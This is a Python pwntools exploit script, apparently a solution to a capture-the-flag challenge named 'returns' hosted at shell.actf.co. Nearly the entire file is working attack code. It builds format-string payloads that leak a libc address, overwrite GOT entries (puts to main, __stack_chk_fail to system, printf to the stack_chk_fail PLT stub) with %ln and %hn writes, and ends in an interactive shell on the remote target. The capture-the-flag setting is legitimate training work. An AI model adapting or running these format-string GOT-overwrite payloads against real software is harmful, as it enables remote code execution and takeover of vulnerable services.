#!/usr/bin/env python
from pwn import *

SERVER = True

# Function addresses:
# puts() -> main()
addr_puts_got = 0x404018
addr_main = 0x4011a6

# printf() -> __stack_chk_fail() -> system()
addr_printf_got = 0x404038
addr_stack_chk_got = 0x404028
addr_stack_chk_plt = 0x401050
# addr_fgets_got = 0x404040

if SERVER:
    # Server offsets
    libc_offset_start_main = 0x020740
    libc_offset_system = 0x045390
else:
    # Local offsets
    libc_offset_start_main = 0
    libc_offset_system = 0x20ca0

#########################################################
def form_fuzzing(start, end):
    return 'ABCDabcd/' + '-'.join(['%00$lx'.replace('00', str(x)) for x in range(start, end+1)])

def form_attack_ln_64bit(addr_victim, addr_override, offset):
    payload = ''

    # Format string to print bytes
    count_to_print = addr_override # replacement function address

    # Format string to write to the address (@ is a placeholder)
    payload += '%@$0p'.replace('0', str(count_to_print - len(payload)))
    payload += '%@$ln'
    #payload += '-%@$lp-'  # test

    # We have written some stuff to the buffer,
    # the offset of 8 to the start of the buffer
    # We need to calculate the new index which points
    # to the address
    add_index = 4
    assert (len(payload) <= (add_index * 8))

    # Here, we will replace the placeholder @@ with the buffer index
    payload = payload.replace('@', str(offset + add_index))

    # We want to make the prior payload string to multiples
    # of 8 bytes. This is so our address will be aligned nicely
    payload = payload.ljust(add_index * 8)
    
    # Finally, write the target address
    payload += p64(addr_victim)

    return payload


def form_attack_hn_16bit(addr_victim, addr_override, offset):
    payload = ''
    count_to_print = addr_override & 0xFFFF

    # Format string to print bytes
    if count_to_print != 0:
        payload += '%0p'.replace('0', str(count_to_print))
    payload += '%@$hn'

    # We have written some stuff to the buffer,
    # the offset of 8 to the start of the buffer
    # We need to calculate the new index which points
    # to the address
    add_index = 4
    assert (len(payload) <= (add_index * 8))

    # Here, we will replace the placeholder with the buffer index
    payload = payload.replace('@', str(offset + add_index))

    # We want to make the prior payload string to multiples
    # of 8 bytes. This is so our address will be aligned nicely
    payload = payload.ljust(add_index * 8)
    
    # Finally, write the target address
    payload += p64(addr_victim)
    return payload

#########################################################
# Strangely, the final byte before the null byte was truncated.
# ie. \x18\x40\x40\x00 is the address, but \x18\x40 
# gets called when I do some debugging. 
# I assume it was due to fgets() removing that final byte.
# As in the code:
#    fgets(item, 50, stdin);
#    item[strlen(item)-1] = 0;
# To fix, change the first instance of null byte to a \xFF
def fix_ctf_code_for_null_byte(payload):
    return payload.replace('\x00', '\xFF', 1)

#########################################################
core = Coredump('./core')

if SERVER:
    p = remote("shell.actf.co", 19307)
else:
    p = process("./returns")

offset = 8

#########################################################
# Part 1
# Leak libc and repeat main()
#########################################################
# Overwrite puts() -> main()
print(p.recvuntil("What item would you like to return?"))
payload = form_attack_ln_64bit(addr_puts_got, addr_main, offset)

# Leak <__libc_start_main+235> at offset 17
extra_payload = '[%@$lp]'.replace('@', str(17))
payload = payload.replace(' '*len(extra_payload), extra_payload)

# Send to executable
payload = fix_ctf_code_for_null_byte(payload)
print('@ Payload 1: ' + payload)
print('@ Payload 1 Length: ' + str(len(payload)))
p.sendline(payload)

# Calculate libc base and system
result = p.recvuntil("What item would you like").replace(' '*10, '')
print(result)

leaked_addr = result.split('[')[1].split(']')[0]
leaked_addr = int(leaked_addr, 16)
print("@ Leaked: " + hex(leaked_addr))

addr_libc_start_main = leaked_addr - 235
#addr_libc_base = addr_libc_start_main - 0x01aa50
print("@ __libc_start_main: " + hex(addr_libc_start_main))

addr_system = addr_libc_start_main - libc_offset_start_main + libc_offset_system
print("@ system: " + hex(addr_system))

#########################################################
# Part 2
# Override 64-bits using 4 operations of 16-bit using %hn
#########################################################

## 1st operation
payload = form_attack_hn_16bit(addr_stack_chk_got, addr_system, offset)
payload = fix_ctf_code_for_null_byte(payload)
print('@ Payload 2a: ' + payload)
print('@ Payload 2a Length: ' + str(len(payload)))
p.sendline(payload)

result = p.recvuntil("What item would you like").replace(' '*10, '')
print(result)

## 2nd operation
payload = form_attack_hn_16bit(addr_stack_chk_got + 2, addr_system >> 16, offset)
payload = fix_ctf_code_for_null_byte(payload)
print('@ Payload 2b: ' + payload)
print('@ Payload 2b Length: ' + str(len(payload)))
p.sendline(payload)

result = p.recvuntil("What item would you like").replace(' '*10, '')
print(result)

## 3rd operation
payload = form_attack_hn_16bit(addr_stack_chk_got + 4, addr_system >> 32, offset)
payload = fix_ctf_code_for_null_byte(payload)
print('@ Payload 2c: ' + payload)
print('@ Payload 2c Length: ' + str(len(payload)))
p.sendline(payload)

result = p.recvuntil("What item would you like").replace(' '*10, '')
print(result)

## 4th operation
payload = form_attack_hn_16bit(addr_stack_chk_got + 6, addr_system >> 48, offset)
payload = fix_ctf_code_for_null_byte(payload)
print('@ Payload 2d: ' + payload)
print('@ Payload 2d Length: ' + str(len(payload)))
p.sendline(payload)

result = p.recvuntil("What item would you like").replace(' '*10, '')
print(result)

#########################################################
# Part 3
# Override printf -> stack_chk_fail()@plt
#########################################################

payload = form_attack_ln_64bit(addr_printf_got, addr_stack_chk_plt, offset)
payload = fix_ctf_code_for_null_byte(payload)
print('@ Payload 3: ' + payload)
print('@ Payload 3 Length: ' + str(len(payload)))
p.sendline(payload)

#########################################################
# Part 4
# We have shell
#########################################################
result = p.recvuntil("trying to scam us").replace(' '*10, '')
print(result)
p.interactive()
quit()
